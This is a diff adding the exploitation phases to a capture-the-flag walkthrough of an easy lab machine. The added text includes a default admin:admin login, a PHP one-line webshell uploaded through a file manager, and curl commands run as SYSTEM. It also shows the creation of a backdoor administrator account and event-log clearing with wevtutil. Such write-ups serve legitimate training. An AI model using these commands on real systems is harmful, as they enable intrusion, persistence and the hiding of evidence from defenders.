@@ -8,7 +8,7 @@ Penetration testing walkthrough for PwnDrive machine
 - **Difficulty:** Easy
 - **Goal:** Capture the flag
 
-## 🔍 Reconnaissance
+## Phase 1: Reconnaissance
 
 First, I scanned the target to find open ports:
 
@@ -24,7 +24,7 @@ PORT      STATE SERVICE       VERSION
 3306/tcp  open  mysql         MariaDB 10.4.14
 3389/tcp  open  ms-wbt-server Microsoft Terminal Service
 ```
-## 🕵️ Enumeration
+## Phase 2: Enumeration
 I ran directory brute-forcing on port 80:
 Directory Brute-forcing
 ``` bash
@@ -38,3 +38,63 @@ Interesting Findings
 /login.php - Login page
 
 /myfiles.php - File manager
+
+## Phase 3: Gaining Access
+Default Credentials
+``` bash
+curl -X POST http://10.150.150.11/login.php -d "username=admin&password=admin"
+```
+Success! Logged in with admin:admin
+
+## Phase 4: Exploitation
+1. Uploading Webshell
+Created shell.php:
+``` bash
+<?php system($_GET['cmd']); ?>
+```
+2. Uploaded via /myfiles.php
+
+3. Accessed at /upload/2/shell.php
+
+Getting SYSTEM Access
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=whoami"
+```
+Output: nt authority\system
+
+## Phase 5: Capturing the Flag
+Finding the Flag:
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=dir%20/s%20C:\*flag*.txt"
+```
+Flag Location:
+``` bash
+C:\Users\Administrator\Desktop\FLAG1.txt
+```
+Flag Content:
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=type%20C:\Users\Administrator\Desktop\FLAG1.txt"
+```
+FLAG: PwnTillDawnAcademyIsAwesome!!!
+
+## Phase 6: Maintaining Access (Optional)
+Creating Backdoor User:
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=net%20user%20hacker%20P@ssw0rd123%20/add"
+curl "http://10.150.150.11/upload/2/shell.php?cmd=net%20localgroup%20administrators%20hacker%20/add"
+```
+##Phase 7: Clearing Tracks
+Deleting Webshell:
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=del%20C:\xampp\htdocs\upload\2\shell.php"
+```
+Clearing Logs:
+``` bash
+curl "http://10.150.150.11/upload/2/shell.php?cmd=wevtutil%20cl%20System"
+curl "http://10.150.150.11/upload/2/shell.php?cmd=wevtutil%20cl%20Application"
+```
+## Tools Used
+1. Nmap
+2. Gobuster
+3. cURL
+4. Browser
